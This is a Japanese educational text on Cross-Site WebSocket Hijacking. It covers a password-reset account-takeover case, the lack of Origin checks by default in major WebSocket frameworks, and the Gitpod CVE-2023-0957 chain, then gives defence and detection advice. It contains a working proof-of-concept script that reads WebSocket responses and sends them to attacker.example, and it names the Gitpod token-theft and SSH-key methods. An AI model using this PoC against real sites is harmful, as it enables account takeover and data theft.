## CSWSH実例とフレームワークのデフォルト脆弱性・CVE

### この節で学ぶこと

CSWSH（Cross-Site WebSocket Hijacking、クロスサイトWebSocketハイジャック）は、これまでの節で扱ったハンドシェイクとOrigin検証欠如の理論を、そのまま実害へ変換する攻撃である。本節では次の3点を、防御と検知の観点から掘り下げる。

- **実例（Medium）**: Cookie認証のWebSocketで、被害者になりすまして双方向チャネルを開き、パスワードリセットリンクを盗み出してアカウント乗っ取りに至る手口の骨格。
- **フレームワークのデフォルト脆弱性**: Express（`ws`）、Django Channels、FastAPI/Starlette、Socket.io という主要4フレームワークが「初期設定のままだとCSWSHに対して無防備」である構造的理由と、それを裏付ける実CVE群。
- **実CVE深掘り**: CVE-2023-0957（Gitpod）。SameSite Cookieのサブドメイン抜け穴とCSWSHを連鎖させ、ワークスペース乗っ取りとRCE（Remote Code Execution、遠隔任意コード実行）にまで到達した事例。

いずれも「なぜ初期設定・仕様の組み合わせで成立してしまうのか」という原理に重点を置く。防御実装の判断材料として読んでほしい。実在サービスへの無許可の再現・検証は行わないこと。

---

### 前提の再確認: CSWSHが成立する2条件

個別事例に入る前に、CSWSHが成立する条件を短くおさらいする。仕組みレベルで押さえておくと、以降のCVEが「なぜ起きたか」が一貫して読めるからである。

1. **ハンドシェイクがCookieベース認証に依存している**。WebSocketの確立はHTTPの`GET`リクエスト（`Upgrade: websocket`付き）で始まる。ブラウザはこのクロスオリジンのアップグレードGETに対しても、宛先ドメインのCookieを自動付与する。サーバーが「Cookieが有効＝正規ユーザー」とだけ判断していると、攻撃者ページから開いた接続も認証済みとして扱われてしまう。
2. **サーバーが`Origin`ヘッダーを検証していない**（sink＝信頼判断の最終的な代入先が実質ノーガード）。WebSocketのハンドシェイクにはCORSのプリフライトが働かず、Same-Origin Policyもフレーム送受信を止めない。したがって`Origin`検証を明示的に実装しない限り、どのオリジンからの接続も受理される。

この2つが揃うと、攻撃者は自分のページ上のJavaScriptで`new WebSocket("wss://victim.example/…")`を実行するだけで、被害者の認証Cookie付きの**双方向チャネル**を掌握できる。CSRF（Cross-Site Request Forgery）が「一方向にリクエストを撃ち込む」のに対し、CSWSHは「サーバーからのプッシュを読み、任意フレームを送り返せる」点で威力が段違いになる。この差が、次に見るアカウント乗っ取りを可能にする。

---

### 実例（Medium）: パスワードリセットリンク窃取によるアカウント乗っ取り

> ⚠️ **未取得の資料**: 「Account Takeover Using Cross-Site WebSocket Hijacking (CSWH)」（Sharan Panegav, Medium）は、記事本文の全文自動取得ができませんでした（理由: MediumがWebFetchに対しHTTP 403 Forbiddenを返し、GitHubミラーにも本文が含まれていなかったため）。要点は検索結果から得られた記述に基づいて再構成しています。正確な手順・スクリーンショットは下記URLからご自身で直接ご覧ください: https://sharan-panegav.medium.com/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50

この記事は、CSWSHの「脆弱性の確認手順」と「アカウント乗っ取りへの武器化」を、実際のバグバウンティの流れに沿って示している。骨格は次の通りである。

#### ステップ1: 対象WebSocketがCSWSHに脆弱かの確認

記事が挙げる確認手順は、破壊的操作を伴わない読み取り中心の検証である。

1. ブラウザで対象Webアプリにログインし、正規の認証済みセッションを確立する。
2. 別タブでWebSocketクライアント（記事では`websocket.org/echo.html`のような外部エコーページ）を開き、対象のWebSocket URL（例: `wss://target.example/socket`）を入力して「Connect」する。
3. 接続が確立し、その別オリジンのページから**サーバーへフレームを送信できてしまう**なら、`Origin`検証が欠如している疑いが濃い。
4. Burp Proxyで正規セッションのWebSocketフレームをキャプチャし、それを再送してサーバーの応答挙動を観察する。

ここで重要なのは、**「別オリジンのページから接続が張れ、かつ認証済みとして応答が返る」こと自体が脆弱性のシグナル**だという点である。前節の成立2条件のうち②（Origin検証欠如）を、外部ページからの接続可否という一次観測で確かめている。

#### ステップ2: 双方向チャネルを使ったアカウント乗っ取り

記事の乗っ取りは、CSWSHを**パスワードリセット機能**と連鎖させるところに核心がある。検索結果から得られた記述によれば、対象アプリではユーザーがログイン中だと、WebSocketの**レスポンスデータの中にパスワードリセットリンクが現れる**という挙動があった。攻撃の連鎖は次のように組み立てられる。

1. 攻撃者は自ドメインに、被害者のブラウザで`new WebSocket()`を実行するJavaScriptを仕込んだページを用意する（PoCの一般形は後掲）。
2. 被害者が（対象にログイン済みの状態で）そのページを開くと、被害者のCookie付きでWebSocketが張られる。
3. 攻撃者ページのJavaScriptは、サーバーからプッシュされる**レスポンスデータ（＝パスワードリセットリンクを含む）を読み取り**、`fetch()`等で攻撃者サーバーへ外部送信（exfiltrate）する。
4. 攻撃者は入手したリセットリンクを使って被害者のパスワードを変更し、アカウントを乗っ取る。

CSRFであればステップ3の「サーバー応答の読み取り」ができないため、この乗っ取りは成立しない。**サーバー応答を読める双方向性こそがCSWSHの威力**であることを、この事例は端的に示している。

（以下は未取得資料の補足として一般知識に基づく解説です）CSWSHのアカウント乗っ取りPoCは、典型的には次のような最小構成のHTML/JavaScriptになる。防御側が「何が読み出され外部送信されるのか」を理解するための例として示す。

```html
<!-- 攻撃者が自ドメインでホストする最小PoC（教育目的の一般形） -->
<script>
  // 被害者のCookieが自動付与された状態で接続が張られる
  const ws = new WebSocket("wss://target.example/socket");

  ws.onopen = () => {
    // 認証済みチャネル上で情報取得系のフレームを送る
    ws.send(JSON.stringify({ type: "getAccountInfo" }));
  };

  // サーバーからのプッシュ（=応答）を読み取り、攻撃者サーバーへ外部送信
  ws.onmessage = (event) => {
    fetch("https://attacker.example/collect", {
      method: "POST",
      body: event.data,          // リセットリンク等の機微データが含まれうる
      mode: "no-cors"
    });
  };
</script>
```

なぜ動くのかを分解すると次の通りである。`new WebSocket()`のアップグレードGETに対し、ブラウザは`target.example`のCookieを自動付与する（成立条件①）。サーバーが`Origin: https://attacker.example`を拒否しないため接続が確立する（成立条件②）。確立後は`onmessage`でサーバーのプッシュを平文で受け取れ、Same-Origin Policyは「別オリジンのWebSocketメッセージのJavaScriptからの読み取り」を妨げない。したがって機微データがそのまま`fetch`で外部に流出する。防御は成立条件のどちらか（理想的には両方）を断つこと——後述の「防御」を参照。

> 出典: Account Takeover Using Cross-Site WebSocket Hijacking (CSWH) — Sharan Panegav, Medium — https://sharan-panegav.medium.com/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50

---

### 主要4フレームワークの「デフォルト脆弱」問題

CSWSHがこれほど広く残存する最大の理由は、**主要WebSocketフレームワークの初期設定が`Origin`検証を行わない**ことにある。DEV.toのまとめ記事は、代表的な4フレームワークについて「デフォルトで脆弱」である構造を整理している。

> 出典: CSWSH: Four Major WebSocket Frameworks Default to Vulnerable While Attackers Get a Bidirectional Channel — DEV.to (roxdavirox) — https://dev.to/roxdavirox/cswsh-four-major-websocket-frameworks-default-to-vulnerable-while-attackers-get-a-bidirectional-hj8

#### なぜ「デフォルトで脆弱」なのか（フレームワーク別）

| フレームワーク | デフォルト挙動 | 脆弱になる理由 |
| --- | --- | --- |
| **Express + `ws`ライブラリ** | `verifyClient`コールバックは**提供されるが必須ではない**。未指定だと**任意のOriginを受理** | 開発者が明示的に`verifyClient`で`Origin`を検査しない限りノーガード |
| **Django Channels** | `OriginValidator` / `AllowedHostsOriginValidator`が用意されているが**デフォルトでは有効化されていない**（オプション扱い） | ドキュメントはリスクを記すが、初期構成では検証が挟まらない |
| **FastAPI / Starlette** | **組み込みのOrigin検証が存在しない**。`CORSMiddleware`は**HTTPルートにのみ適用**され、WebSocketには効かない | 「CORSを設定したから安全」という誤解が生じやすい（CORSはWSハンドシェイクを守らない） |
| **Socket.io（2.4.0より前）** | **全Originをデフォルト受理**。2.4.0でpolling transportのCORSを無効化したが、部分的対応にとどまる | 旧バージョンは無条件受理。バージョン依存の注意が必要 |

ここで最も重要な原理は、**「CORS設定＝WebSocket防御」ではない**という点である。FastAPI/Starletteの`CORSMiddleware`はHTTPのCORSレスポンスヘッダーを制御するものであり、WebSocketのアップグレードには関与しない。WebSocketハンドシェイクにはそもそもCORSプリフライトが発生しないため、CORS設定がどれだけ厳格でも、`Origin`の明示的なサーバー側検証がなければCSWSHは通る。この「守っているつもりで守れていない」ギャップが、デフォルト脆弱性の本質である。

#### 「デフォルト脆弱」を裏付ける実CVE

DEV記事は、これらのデフォルト挙動が現実の重大脆弱性として顕在化した例を挙げている。

- **CVE-2020-25094 / CVE-2020-25095（LogRhythm）**: CSWSHを**コマンドインジェクション**と連鎖させ、**LocalSystem権限での認証不要RCE**に到達。CSWSHが単独でなく、他の欠陥のトリガー・増幅装置として働くことを示す。
- **CVE-2023-0957（Gitpod）**: 「コード実行を含む完全なワークスペース乗っ取り」。CSWSHとSameSiteサブドメイン抜け穴の連鎖（次項で詳述）。
- **CVE-2024-51775（Apache Zeppelin）**: CVSS 7.5。認証済みセッションから**paragraph（ノートブックの段落）内容の窃取**を許した。CSWSHによる情報漏洩の典型例。

#### 検知の指標（防御側の実務）

DEV記事が示す検知の勘所はシンプルかつ実務的である。**「攻撃者ドメインを指す`Origin`ヘッダー」＋「有効なセッションCookieの同時存在」**という組み合わせは、正規トラフィックには通常現れない。正規クライアントの`Origin`は必ず自サービスのオリジンになるからである。したがって、WebSocketアップグレードのログでこの組み合わせを検出できれば、CSWSH試行の高精度なシグナルになる。

#### 3層防御スタック

DEV記事が推奨する多層防御は次の通りで、いずれも成立条件を断つ発想に基づく。

1. **サーバー側Originアローリスト（最優先）**: `Origin`を明示的に検査し、許可リストに一致しない、または`Origin`が欠落しているハンドシェイクを拒否する。成立条件②を直接断つ。
2. **アップグレードURLへのCSRFトークン**: ハンドシェイクのクエリパラメータに短命トークンを載せ、サーバーで検証する。攻撃者は被害者のトークンを事前に知り得ないため接続を張れない。
3. **SameSite Cookie**: `Strict`が望ましい。`Lax`も現行ブラウザでは有効だが、古いクライアントでは確実性が下がる。成立条件①（Cookie自動付与）を弱める。ただし後述のGitpod事例のように、サブドメイン構成では`SameSite`が抜けられる場合があるため、①だけに依存しないこと。

---

### 実CVE深掘り: CVE-2023-0957（Gitpod）

CVE-2023-0957は、クラウド開発環境Gitpodにおける**Cross-Site WebSocket Hijacking**の脆弱性で、CSWSHが単なる情報漏洩を超えて**ワークスペース完全乗っ取りとRCE**に直結した代表例である。

#### 概要と評価

- **対象**: Gitpod（`release-2022.11.2.16`より前のバージョン）。
- **脆弱性種別**: CSWSH。GitpodのJSONRPCサーバーへのWebSocket接続で`Origin`ヘッダーが制限されておらず、被害者の資格情報でWebSocket接続を確立できた。
- **影響**: ワークスペースからのデータ抽出から、**ワークスペースの完全乗っ取り**まで。さらにコード実行（RCE）と、被害者のSCM（Source Control Management、GitHub等のソース管理）アカウントへのアクセスに至った。
- **CVSSスコア**: NVDのCVSS 3.1基本値は**8.2（HIGH）**とされる一方、一部評価では**9.6（Critical）**とされている（評価元により差がある点に注意）。
- **修正版**: `release-2022.11.2.16`。Gitpodは**ベースドメインからのみWebSocket接続を許可する**ように修正した。
- **タイムライン**: 2023年2月13日に開示・ベンダー確認、2月14日に本番環境へパッチ適用、2月22日にCVE採番、3月1日にセルフホスト版パッチ公開。

> 出典: CVE-2023-0957 — NVD (National Vulnerability Database) — https://nvd.nist.gov/vuln/detail/CVE-2023-0957

> ⚠️ **未取得の資料**: NVDの詳細ページ（CVE-2023-0957）は、WebFetchでは動的レンダリングのため本文が取得できませんでした（理由: NVDのSPAが静的HTMLに脆弱性本文を含めず、"NVD - Home"のみが返ったため）。上記の記述はNVDおよびGitpod公式アドバイザリ・Snyk Labsの解析を突き合わせて再構成しています。原典は上記URLからご自身でご確認ください。

#### 仕組み: なぜワークスペース乗っ取りまで届いたか

Gitpodの内部構造と攻撃連鎖を、Snyk Labsの解析に沿ってメカニズムレベルで分解する。

> 出典: Gitpod remote code execution 0-day vulnerability via WebSockets — Snyk Labs — https://labs.snyk.io/resources/gitpod-remote-code-execution-vulnerability-websockets/

**(1) 認証がハンドシェイク時のCookieだけに依存していた**
GitpodはTypeScript製アプリが**WebSocket上でJSONRPC API**を公開し、Reactフロントエンドがそれを消費する構成だった。認証は**WebSocketハンドシェイク時のHTTP Cookieのみ**に依存し、確立後のチャネル内では追加検証がなかった。これは成立条件①そのものである。

**(2) Origin検証がなく、Same-Origin PolicyはWSを止めない**
サーバーは`Origin`ヘッダーを検証していなかった。WebSocketにはSame-Origin Policyが（フレーム送受信に対しては）適用されないため、任意ドメインから`gitpod.io`へのクロスオリジンWebSocket接続を開始できた。成立条件②である。

**(3) SameSite Cookieのサブドメイン抜け穴（核心）**
Gitpodは`SameSite` Cookieを使っていたが、ここに**サブドメインの抜け穴**があった。`SameSite`の「site（サイト）」判定は、**スキーム＋登録可能ドメイン（registrable domain）の組み合わせ**で行われる。Gitpodのワークスペースは`*.gitpod.io`というサブドメイン上で動くため、**攻撃者が用意したGitpodワークスペース（`something.gitpod.io`）から本体`gitpod.io`へ送るリクエストは「same-site」と見なされ、被害者の`SameSite` Cookieが付与されてしまう**。

ここが最重要のポイントである。`SameSite`は「クロスサイト」を防ぐ仕組みだが、判定単位は「オリジン」ではなく「登録可能ドメイン」である。したがって**同一登録可能ドメイン配下の別サブドメイン間は`SameSite`の壁を越えられる**。マルチテナントがユーザー制御可能なサブドメインを配る構成（`*.gitpod.io`のような）では、この抜け穴が`SameSite`防御を無力化する。前項の3層防御で「①だけに依存しないこと」と述べた理由がこれである。

**(4) 攻撃連鎖: ワークスペース乗っ取りとRCE**
以上を組み合わせた攻撃の流れは次の通りである（防御理解のための連鎖の説明であり、再現手順ではない）。

1. 攻撃者がGitpod上に自分のワークスペースをホストする（`*.gitpod.io`上で動く）。
2. そのワークスペースのVS Codeサーバーのエンドポイント（`/version`）を改変し、**悪性JavaScriptを含むHTMLを配信**させる。
3. 被害者にそのリンクを送る。被害者がGitpodにログイン済みの状態で開くと、サブドメイン抜け穴により`SameSite` Cookieが付いた状態で、本体`gitpod.io`のJSONRPCサーバーへWebSocketが張られる。
4. 悪性JavaScriptがJSONRPCメソッドを呼び出し、機微情報を抽出する: `getLoggedInUser`（ログインユーザー情報）、`getGitpodTokens`（Gitpodトークン）、`getOwnerToken`（オーナートークン）。
5. さらに`addSSHPublicKey`で**攻撃者のSSH公開鍵を被害者アカウントに登録**する。これにより攻撃者はSSHでワークスペースへアクセスでき、**任意コード実行（RCE）**とワークスペース完全乗っ取りに至る。

この連鎖の恐ろしさは、CSWSHが「情報を読む」だけでなく、双方向性を活かして`addSSHPublicKey`のような**状態変更mutationを被害者として実行**した点にある。トークン窃取（読み取り）と鍵登録（書き込み）の両方が同一チャネルで行えるため、乗っ取りが完結する。

#### 修正の原理

Gitpodは**「WebSocket接続をベースドメインからのみ許可する」**ように修正した。これは実質的に、サブドメイン（`*.gitpod.io`）からの本体へのWebSocketハンドシェイクを拒否する`Origin`検証であり、成立条件②を断つと同時に、サブドメイン抜け穴の経路自体を塞ぐ。教訓は、**マルチテナントでユーザー制御可能なサブドメインを配る設計では、`SameSite`に頼らず、WebSocketの`Origin`を厳格にベースドメインへ限定せよ**ということである。

---

### 本節のまとめ

- CSWSHは「Cookie依存認証」＋「Origin検証欠如」の2条件で成立し、**サーバー応答を読める双方向性**によってCSRFを超える実害（パスワードリセットリンク窃取によるアカウント乗っ取り等）を生む。
- Express（`ws`）、Django Channels、FastAPI/Starlette、Socket.io（旧版）は**初期設定で`Origin`を検証しない**。特にFastAPI/Starletteでは`CORSMiddleware`がWebSocketを守らない点が誤解の温床になる。**CORS設定はWebSocket防御ではない**。
- CVE-2023-0957（Gitpod, 2023年, CVSS 8.2〜9.6, 修正版`release-2022.11.2.16`）は、**`SameSite`のサブドメイン抜け穴**とCSWSHを連鎖させ、トークン窃取＋`addSSHPublicKey`によるワークスペース乗っ取り・RCEに到達した。`SameSite`は「登録可能ドメイン」単位の防御であり、ユーザー制御サブドメイン構成では単独で頼れない。
- 防御は**サーバー側Originアローリスト（最優先）＋アップグレードURLのCSRFトークン＋SameSite Cookie**の多層で、成立条件を複数同時に断つこと。検知は「攻撃者ドメインのOrigin＋有効セッションCookie」の同時出現を監視する。
